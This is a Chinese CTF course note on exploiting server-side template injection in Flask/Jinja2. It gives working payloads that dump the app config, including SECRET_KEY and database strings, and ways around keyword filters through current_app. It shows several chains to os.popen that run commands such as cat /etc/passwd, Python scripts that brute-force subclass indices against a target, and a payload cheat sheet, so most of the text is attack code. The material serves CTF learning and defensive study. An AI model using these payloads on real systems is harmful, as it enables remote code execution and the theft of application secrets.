---
title: SSTI 获取 config 与 os 函数调用
category: SSTI/利用
tags: [SSTI, config, current_app, url_for, lipsum, os.popen, _wrap_close, importlib, linecache]
source: 课程笔记 20251014
order: 4
---

## 一句话概括

拿到 SSTI 后，有两条不用爬继承链的捷径：**`{{config}}`** 直接读应用配置（flag 常藏在这里），以及 **`lipsum.__globals__`** 直接拿 `os` 执行命令。继承链只是「找不到现成入口」时的兜底。

## 原理

### 1. 最省事的入口：`{{config}}`

Flask 把应用配置对象 `config` 直接注入到了模板上下文里，**不用任何魔术属性**就能读：

```python
{{config}}
```

它会把配置信息（含 `SECRET_KEY`、数据库连接串，以及题目塞进去的 `FLAG`）整体展示在页面上。

> 原笔记：若未过滤 config，`{{config}}` 会将文件信息直接展示到页面上。
> 若过滤了 `config`（如直接把关键词拦掉），**直接输入会返回 `none`** —— 这本身就是「config 在这里但被过滤了」的信号。

### 2. config 被过滤时：借 `current_app` 绕过

关键词被拦不代表对象取不到。换一个**其 `__globals__` 里包含 `current_app` 的函数**去间接拿：

```python
{{ url_for.__globals__['current_app'].config }}
```

```python
{{ get_flashed_messages.__globals__['current_app'].config }}
```

原理就是原笔记写的那句：**利用已加载的内置函数或对象，去寻找被过滤字符串对应的对象**。`'config'` 被拦，但 `['current_app'].config` 里的 `config` 是**属性访问**，路径和字面量都变了，过滤器认不出来。

### 3. Flask 模板上下文里有什么

**内置函数**：

| 函数 | 功能 |
|---|---|
| `lipsum` | 可加载第三方库（**实际是拿 `os` 的跳板**） |
| `url_for` | 返回 URL 路径（**`__globals__` 里能拿到 `current_app`、`__builtins__`**） |
| `get_flashed_messages` | 获取 flash 消息（同 `url_for`，可拿 `__builtins__`） |

**内置对象**：

| 对象 | 功能 |
|---|---|
| `config` | 应用配置（**flag 高频藏身处**） |
| `request` | 请求对象（可取参数、Cookie、请求头） |
| `session` | 会话数据 |
| `cycler` | 循环器 |
| `joiner` | 连接器 |
| `namespace` | 命名空间 |

**高危函数**（原笔记标注）：

- **`url_for`** —— 通过 `__globals__` 访问系统模块
- **`lipsum`** —— 可能加载第三方库执行代码
- **`config`** —— 可能包含数据库密码等敏感信息

### 4. 用 `lipsum` 直接拿 os

`lipsum` 是 Flask 注入的模板全局函数，它的 `__globals__` 指向 Flask 内部的命名空间，里面 import 了 `os`：

```python
# 第 1 步：看 lipsum 的全局命名空间里有哪些模块（原笔记提醒：从图上抄回来记得把 __ 补全）
{{lipsum.__globals__}}

# 第 2 步：搜索相关函数（例如 os）
# 第 3 步：有则取出 os 模块
{{lipsum.__globals__['os']}}

# 第 4 步：调用 popen 执行命令
{{lipsum.__globals__.os.popen('cat /etc/passwd')}}

# 第 5 步：read() 回显
{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}
```

> tips：`cat /etc/passwd` 里的**空格不能少**，否则命令拼起来会报错。

这条链比继承链短得多：`lipsum` 是模板里现成的名字，`__globals__` 直接给出命名空间，省掉了「找子类索引」这一步。

### 5. 继承链路线：`os._wrap_close`

如果 `lipsum` 被过滤，再回到《02》的继承链。目标是找 **`os._wrap_close`** 这个类 —— 它的 `__init__.__globals__` 就是 **`os` 模块自己的命名空间**：

```python
# 先看某个索引是什么类
{{ ''.__class__.__base__.__subclasses__()[158] }}
# 返回 <class 'os._wrap_close'>
```

```python
# 用它执行命令
{{ ''.__class__.__base__.__subclasses__()[158].__init__.__globals__['popen']('id').read() }}
```

**这里有个关键差异，原笔记实测过**：

| 写法 | 结果 |
|---|---|
| `...__globals__['popen']('id').read()` | **可用** |
| `...__globals__.os.popen('id').read()` | **不可用** |

原笔记的结论是「`os` 对象存在，但它的 `popen` 方法不可用或访问受限，而直接暴露的 `popen` 函数是完整可用的」。更准确的机制是：

- `_wrap_close.__init__.__globals__` 就是 **`os` 模块自己的命名空间**
- 模块**不会 import 自己**，所以这个字典里**没有名为 `os` 的键** → `__globals__.os` 取不到
- 而 `popen` 是 `os` 模块自己定义的函数，字典里**有** `popen` 键 → `__globals__['popen']` 取得到

所以对 `os._wrap_close` 应该直接用：

```text
.__globals__['popen']()    ✅
.__globals__['system']()   ✅
.__globals__['listdir']()  ✅
```

而不是：

```text
.__globals__.os.popen()    ❌
.__globals__.os.system()   ❌
```

**判断口诀：先看 `__globals__` 属于哪个模块 —— 是 os 本身就直接取 `popen`；是别的模块（import 了 os）就用 `.os.popen`。**

### 6. 兜底：找 os 的脚本

原笔记写了个脚本，遍历子类、打印 `__globals__`，命中 `os.py` 的即为可用索引：

```python
import requests

url = "http://靶机地址/"

for i in range(500):
    payload = "{{ ''.__class__.__base__.__subclasses__()[%d].__init__.__globals__ }}" % i
    try:
        r = requests.get(url, params={"name": payload}, timeout=3)
        if r.status_code == 200 and 'os.py' in r.text:
            print(f"找到包含 os 模块的类 - 索引: {i}")
    except Exception:
        pass
```

> 原笔记特别标注：**只能用 GET 请求获取**（POST 时 payload 没被正确传给 `name`，因此扫不到结果）。

### 7. 另外两个执行入口

**`importlib` 加载模块**：

`importlib` 可以加载第三方库 —— 与 `eval`（调用自身已有函数）不同，它是**直接把模块加载进来**：

```python
{{ ''.__class__.__base__.__subclasses__()[69]["load_module"]("os")["popen"]("ls -l /opt").read() }}
```

`[69]` 是 `_frozen_importlib.BuiltinImporter` 的索引，用脚本扫出来：

```python
import requests

url = "http://靶机地址/"

for i in range(500):
    payload = "{{ ''.__class__.__base__.__subclasses__()[" + str(i) + "] }}"
    try:
        r = requests.get(url, params={"name": payload}, timeout=3)
        if r.status_code == 200 and '_frozen_importlib.BuiltinImporter' in r.text:
            print(f"找到 BuiltinImporter - 索引: {i}")
    except Exception:
        pass
```

**`linecache` 里的 os**：

`linecache` 用于读取任意文件的某一行，它内部 `import os`，所以可以从它的命名空间里取出 `os`：

```python
{{ [].__class__.__base__.__subclasses__()[191].__init__.__globals__["linecache"]["os"].popen("ls -l /").read() }}
```

```python
{{ [].__class__.__base__.__subclasses__()[191].__init__.__globals__.linecache.os.popen("ls -l /").read() }}
```

> 注意和 `_wrap_close` 的区别：这里 `__globals__` 是 **`linecache` 模块**的命名空间，`linecache` 自己 `import os` 了，所以 `linecache.os` / `.os` 这种**带模块名**的写法是**有效**的。而前文的 `_wrap_close` 的 `__globals__` 是 `os` 模块本身，才不能用 `.os`。

> 此处原为「各类执行入口对比 / 总结」的截图，要点即本文第 5、7 节四种入口（`popen` 直取、`importlib.load_module`、`linecache.os`、`__builtins__`）的适用差异。

## 利用条件

1. 已确认存在 SSTI
2. `config` 或 `lipsum` / `url_for` / `get_flashed_messages` 至少有一个可用（或可走继承链）
3. 目标子类被加载（继承链路线需先扫索引）
4. 有回显（`.read()` 的输出能出现在响应里）

## Payload 速查

| 目的 | Payload |
|---|---|
| 直接读配置 | `{{config}}` |
| config 被过滤时读配置 | `{{url_for.__globals__['current_app'].config}}` |
| 同上（换函数） | `{{get_flashed_messages.__globals__['current_app'].config}}` |
| 看 lipsum 命名空间 | `{{lipsum.__globals__}}` |
| 取 os 模块 | `{{lipsum.__globals__['os']}}` |
| 执行命令 + 回显 | `{{lipsum.__globals__.os.popen('cat /etc/passwd').read()}}` |
| 继承链直接取 popen | `...__globals__['popen']('id').read()` |
| importlib 加载 os | `...['load_module']('os')['popen']('ls').read()` |
| linecache 里的 os | `...['linecache']['os'].popen('id').read()` |
| 通过 builtins 导入 | `...__globals__['__builtins__']['__import__']('os').popen('id').read()` |

## 踩坑与备注

- **`{{config}}` 返回 `none` 说明被过滤，不代表没有 config**：换 `current_app` 路线即可。
- **`lipsum` 为什么有时拿不到 `current_app`**：原笔记的解释是「它不是视图函数」—— **视图函数**处理请求时由框架自动调用，能访问完整 Flask 上下文；**全局函数**（如 `lipsum`）只是模板工具，手动调用，访问权限取决于它定义的位置。所以取 `current_app` 更稳的是 `url_for` / `get_flashed_messages`。
- **`__globals__['popen']` vs `__globals__.os.popen` 别混**：取决于这个 `__globals__` 是属于 os 模块（直接取 `popen`）还是属于别的模块（用 `.os.popen`）。见第 5 节。
- **`cat` 后面必须有空格**：`'cat /etc/passwd'` 少写空格会变成 `cat/etc/passwd`，命令直接失败。
- **索引因环境而异**：`[158]`、`[69]`、`[191]` 都是特定环境的数字，务必先用脚本扫一遍。
- **`os.system()` 无回显**：要回显一律用 `popen(...).read()`。
- **原笔记靶机地址属一次性环境地址**，本文统一写作 `靶机地址`。
- **扫描脚本的输出依赖回显**：如果应用基于「输出内容」做过滤（见《SSTI文件读取》），`{{...__subclasses__()[i].__init__.__globals__}}` 这类会打印模块名的 payload 可能被清空，`os.py` 就搜不到 —— 此时改用 `['os'].popen('id').read()` 这种**输出是命令结果**的 payload 直接试。
